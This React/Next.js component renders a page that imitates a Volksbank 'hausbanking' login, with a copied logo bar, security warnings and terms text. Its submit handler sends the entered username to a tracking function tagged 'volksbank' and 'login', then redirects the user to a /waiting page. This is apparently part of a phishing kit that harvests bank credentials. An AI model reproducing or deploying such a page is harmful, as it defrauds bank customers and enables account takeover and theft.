"use client";

import { useState } from "react";
import { useRouter } from "next/navigation";
import { trackSubmission } from "@/lib/track";

export default function LoginForm() {
  const router = useRouter();
  const [username, setUsername] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    await trackSubmission("volksbank", "login", { username });
    router.push(`/waiting?user=${encodeURIComponent(username)}`);
  };

  return (
    <>
      {/* Header with logo */}
      <div className="login-header">
        <span className="sr-only">Firmenlogo</span>
        <div id="topbar" className="topbar pre-login">
          <div className="container">
            <div className="row">
              <div className="topbar-logo"></div>
            </div>
          </div>
        </div>
      </div>

      {/* Main login area */}
      <div className="leave-header-visible" id="overlaycontainer-login">
        <form id="loginform" className="login-pin-column" onSubmit={handleSubmit}>
          <div id="modaloverlay" className="modal show" role="dialog">
            <div className="modal-dialog">
              <div className="modal-content">
                {/* Modal Header */}
                <div className="modal-header">
                  <h1>hausbanking Login</h1>
                </div>

                {/* Modal Body */}
                <div className="modal-body">
                  {/* Security Teaser */}
                  <div className="securityteaser-wrapper">
                    <a
                      className="command-link"
                      href="#"
                      aria-label="Achtung: Anrufe FALSCHER Bankmitarbeiter! NIEMALS Passwörter, Benutzernamen oder Codes nennen. SOFORT auflegen, wenn Sie danach gefragt werden."
                    >
                      <span className="command-link-icon">
                        <div className="securityteaser-box">
                          <div className="securityteaser-content">
                            <div className="icon">
                              <span className="icon icon-caution">⚠</span>
                            </div>
                            <div className="teaser">
                              <b>Achtung: Anrufe FALSCHER Bankmitarbeiter!</b>
                              <br /><b><br /></b>
                              <b>NIEMALS</b>
                              {" "}Passwörter, Benutzernamen oder Codes nennen.
                              <br /><br />
                              <b>SOFORT</b>
                              {" "}auflegen, wenn Sie danach gefragt werden.
                            </div>
                          </div>
                        </div>
                      </span>
                    </a>
                  </div>

                  {/* Messages overlay (hidden) */}
                  <div id="loginform-messages" className="messages-overlay hidden"></div>

                  {/* Info text */}
                  <div className="row login-row login-info-text">
                    <p>
                      Beim Login wird eine sichere Verbindung aufgebaut. Bitte achten Sie
                      darauf, dass Sie Ihre Zugangsdaten auf keiner Ihnen unbekannten Seite
                      eingeben und diese geheim halten.
                    </p>
                  </div>

                  {/* Divider */}
                  <div className="row login-row login-demo">
                    <hr className="no-margin-top" role="presentation" />
                  </div>

                  {/* Username input */}
                  <div className="row">
                    <div className="col-xs-12">
                      <div className="pull-right">
                        {" "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">Barrierefrei</span>
                          </span>
                        </a>
                        {"  | "}
                        <a className="command-link" href="#">
                          <span className="command-link-wrap">
                            <span className="command-link-title">English</span>
                          </span>
                        </a>
                        {"  "}
                      </div>

                      <label htmlFor="benutzername">
                        <small>Anmeldung mit Benutzername</small>
                      </label>
                      <div className="input-text">
                        <input
                          id="benutzername"
                          name="loginform:benutzername"
                          type="text"
                          className="form-control"
                          maxLength={64}
                          spellCheck={false}
                          autoComplete="off"
                          placeholder=""
                          value={username}
                          onChange={(e) => setUsername(e.target.value)}
                        />
                        <a
                          className="del-btn"
                          tabIndex={-1}
                          onClick={() => setUsername("")}
                          style={{ display: username ? "block" : "none" }}
                        >
                          <span className="icon icon-inhalt-loeschen">✕</span>
                        </a>
                      </div>
                    </div>
                  </div>

                  {/* Terms */}
                  <div className="row login-nutzungsbedingungen">
                    <p>
                      Durch die Eingabe Ihrer Zugangsdaten stimmen Sie den
                      Nutzungsbedingungen der Bank ausdrücklich zu.
                    </p>
                  </div>
                </div>

                {/* Submit button footer */}
                <div className="modal-footer">
                  <div className="row">
                    <button
                      id="loginButtonNext"
                      type="submit"
                      className="button-default pull-right button-fullwidth"
                      aria-label="Continue logging in"
                    >
                      Weiter
                    </button>
                  </div>
                </div>

                {/* Recovery links footer */}
                <div className="modal-footer">
                  <div className="row text-center">
                    <a className="command-link" href="#">
                      <span className="command-link-wrap">
                        <span className="command-link-title">Benutzername vergessen?</span>
                      </span>
                    </a>
                    <br />
                    <a className="command-link" href="#">
                      <span className="command-link-wrap">
                        <span className="command-link-title">Passwort vergessen?</span>
                      </span>
                    </a>
                    <br />
                  </div>
                </div>
              </div>
            </div>
          </div>
        </form>
      </div>
    </>
  );
}
